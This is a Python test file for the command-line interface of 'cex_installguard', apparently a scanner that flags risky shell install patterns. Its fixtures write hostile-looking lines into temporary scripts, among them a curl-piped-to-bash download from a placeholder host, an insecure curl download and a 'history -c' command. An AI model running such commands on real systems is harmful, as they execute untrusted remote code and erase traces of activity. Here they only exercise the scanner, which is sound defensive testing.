"""CLI-level tests."""
from cex_installguard.cli import main


def test_rules(capsys):
    assert main(['--rules']) == 0
    out = capsys.readouterr().out
    assert 'IG001' in out and 'IG034' in out


def test_baseline_and_suppression(tmp_path):
    target = tmp_path / 'x.sh'
    target.write_text('curl https://x.invalid/a | bash\n')
    baseline = tmp_path / 'base.json'
    assert main([str(target), '--save-baseline', str(baseline),
                 '--no-color']) == 2
    assert main([str(target), '--baseline', str(baseline),
                 '--no-color']) == 0


def test_min_severity_filter(tmp_path, capsys):
    target = tmp_path / 'y.sh'
    target.write_text('curl -k https://x.invalid/a -o /tmp/a\n')
    rc = main([str(target), '--min-severity', 'critical', '--no-color',
               '--compact'])
    assert rc == 0  # everything below critical suppressed
    assert 'BLOCK' not in capsys.readouterr().out


def test_quiet_mode(tmp_path, capsys):
    target = tmp_path / 'z.sh'
    target.write_text('history -c\n')
    assert main([str(target), '--quiet', '--no-color']) == 0
    out = capsys.readouterr().out
    assert 'INSTALLGUARD' not in out  # no banner in quiet mode
    assert 'IG041' in out             # findings are still printed
